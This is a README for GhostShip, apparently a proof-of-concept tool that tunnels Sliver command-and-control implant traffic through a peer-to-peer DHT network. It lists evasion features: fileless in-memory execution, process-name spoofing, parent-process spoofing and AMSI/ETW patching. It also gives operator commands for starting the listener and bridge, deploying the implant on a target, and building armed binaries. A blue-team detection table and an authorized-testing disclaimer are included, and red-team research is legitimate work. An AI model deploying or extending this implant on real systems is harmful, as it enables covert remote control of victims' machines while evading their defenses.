# GhostShip

## P2P Command & Control Bridge
### v1.0.0-alpha

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Proof of Concept](https://img.shields.io/badge/Status-PoC-orange.svg)](#)

---

## Overview

**GhostShip** is a peer-to-peer (P2P) communication layer designed to bridge [Sliver C2](https://github.com/BishopFox/sliver) implants and servers through the [HyperDHT](https://github.com/holepunchto/hyperdht) network.

By utilizing [Holesail](https://github.com/holesail/holesail) technology, GhostShip allows C2 traffic to traverse the internet via a decentralized DHT, effectively bypassing the need for public IPs, static domains, or traditional VPS infrastructure.

> [!IMPORTANT]
> **This is a Proof of Concept (PoC)** — GhostShip was developed to explore the feasibility of P2P-based C2 communication. The current implementation relies on workarounds (bridging Sliver rather than native integration) to validate the concept. If proven effective, the recommended path forward is developing a purpose-built C2 with native P2P transport, rather than maintaining a bridge architecture.

---

## Key Features

- **P2P Transport**: Routes mTLS Sliver traffic over HyperDHT. No direct connection between the target and the operator's IP.
- **Universal Loader**: A Go-based manager for both **Linux** and **Windows** implants.
- **Stealth Residency**:
  - **Linux**: Uses `memfd_create` to execute the node runtime and payload directly from memory.
  - **Windows**: Implements **PPID Spoofing** and basic **AMSI/ETW Patching** to hinder local detection.
- **In-Memory IPC**: Communication between the P2P client and the Sliver payload happens via internal pipes (`socketpair` on Linux, `Named Pipes` on Windows), avoiding local port bindings.

---

## Architecture

```mermaid
flowchart LR
    subgraph TARGET["TARGET MACHINE"]
        SLIVER_P["Sliver Payload"]
        NODE_C["Node.js Client"]
        SLIVER_P <-->|"socketpair (Linux)<br>Named Pipe (Windows)"| NODE_C
    end

    subgraph OPERATOR["OPERATOR MACHINE"]
        BRIDGE["Bridge<br>(HyperDHT)"]
        SLIVER_S["Sliver Server"]
        BRIDGE <-->|"TCP :8888<br>(mTLS)"| SLIVER_S
    end

    NODE_C <-->|"UDP/P2P<br>HyperDHT Network"| BRIDGE

    style TARGET fill:#1a1a2e,stroke:#e94560,color:#fff
    style OPERATOR fill:#1a1a2e,stroke:#0f3460,color:#fff
```

**Data Flow:**
1. Operator starts Sliver server with mTLS listener on port 8888
2. Bridge connects to Sliver and exposes it via HyperDHT, generating a connection key (`hs://...`)
3. Implant connects to HyperDHT using the connection key
4. Sliver payload communicates through internal IPC (socketpair/Named Pipe) to the Node.js client
5. Node.js client tunnels traffic over P2P to the bridge
6. Bridge forwards traffic to local Sliver server

---

## Strengths & Limitations

| Category | Strengths | Limitations |
|----------|-----------|-------------|
| **Infrastructure** | No public IP, domain, or VPS required. Connection key is the only "address" | Bridge must be running for implant connectivity |
| **Network Stealth** | No direct IP connection between target and operator | UDP/DHT traffic is visible to network monitoring. Traffic patterns may be flagged by DPI/ML detection |
| **Local Stealth (Linux)** | LD_PRELOAD hook redirects TCP to socketpair. No listening ports visible via `netstat`/`ss`. Fileless execution via `memfd_create`. Process names spoofed as `[kworker/...]` | Processes visible in `ps`. `/proc` filesystem exposes process info. Memory forensics can find payloads |
| **Local Stealth (Windows)** | Named Pipe transport (no TCP listener). PPID Spoofing (child of svchost.exe). AMSI/ETW patching blinds local telemetry | Not a rootkit. No kernel-level hiding. EDR signatures will eventually detect |
| **Capability** | Full Sliver C2 feature set: shell, upload, download, pivoting, etc. | Binary size ~70-100MB due to embedded Node.js runtime |
| **Architecture** | Validates P2P C2 feasibility. Works across NAT without port forwarding | Bridge design introduces complexity. Native P2P C2 would be more robust |

---

## Security Considerations

| Aspect | For Red Teams | For Blue Teams |
|--------|---------------|----------------|
| **Key Management** | Rotate connection keys between operations. Treat keys as credentials | Intercepted keys may allow traffic decryption |
| **Network Detection** | Test DHT traffic against target's security stack before deployment. Consider traffic timing to avoid pattern detection | Monitor for unusual UDP traffic patterns (DHT bootstrap nodes). Alert on HyperDHT protocol signatures |
| **Process Detection** | Verify process spoofing against target's EDR | Look for processes with spoofed names (`[kworker/...]`). Check for `LD_PRELOAD` in `/proc/<pid>/environ` |
| **Windows Detection** | Test AMSI/ETW patches against current AV/EDR | Monitor named pipe creation (`\\.\pipe\gspipe`). Detect AMSI/ETW tampering via integrity checks |
| **Memory Forensics** | Payload resides in memory, not disk | Memory scanning can reveal Sliver signatures. Monitor `memfd_create` syscalls |

---

## Quick Start

### 1. Prepare Sliver (Operator)
Start your Sliver server and enable an mTLS listener:
```bash
sliver > mtls --lport 8888
```

### 2. Start the Operator Bridge
The bridge connects your local Sliver listener to the DHT.

```bash
./bridge-linux --port 8888
# Output: Connection Key: hs://<public_key>
```

### 3. Deploy the Implant (Target)
Run the GhostShip loader on the target, providing the connection key generated by your bridge.

**Linux:**
```bash
chmod +x ghostship-linux
./ghostship-linux --connect "hs://<public_key>"
```

**Windows:**
```powershell
.\ghostship-windows.exe --connect "hs://<public_key>"
```

---

## Arming the Implant

The CI/CD pipeline automatically builds armed binaries on release. For manual builds:

1. **Obtain a Node.js binary** compatible with your target platform
2. **Generate your Sliver implant**:
   - Linux: `generate --mtls 127.0.0.1:8888 --os linux --arch amd64`
   - Windows: `generate --named-pipe '\\.\pipe\gspipe' --os windows --arch amd64`
3. **Bundle and Build:**
   ```bash
   ./bundle.sh /path/to/node /path/to/implant
   make build-linux   # or make build-windows
   ```

> **Note:** The Named Pipe path (`\\.\pipe\gspipe`) is hardcoded in the loader. To use a different pipe name, modify the `PIPE_NAME` constant in `loader_windows.go` and regenerate the Sliver implant with the matching `--named-pipe` value.

---

## Project Structure

```
ghostship/
├── implant/
│   ├── main.go                 # Entry point
│   └── core/
│       ├── loader_linux.go     # Linux: memfd, socketpair, LD_PRELOAD
│       ├── loader_windows.go   # Windows: PPID spoof, AMSI/ETW, Named Pipes
│       └── assets/
│           ├── client.js       # P2P client (Linux)
│           ├── client-windows.js
│           └── native/
│               └── gshook.c    # LD_PRELOAD hook source
├── bridge/
│   ├── go/                     # Go bridge implementation
│   └── nodejs/                 # Node.js bridge implementation
└── .github/
    └── workflows/
        └── release.yml         # CI/CD pipeline
```

---

## Disclaimer

This project is for **authorized security research and penetration testing only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

## License

MIT License - See [LICENSE](LICENSE) for details.

---

*GhostShip - Sailing through the DHT.*
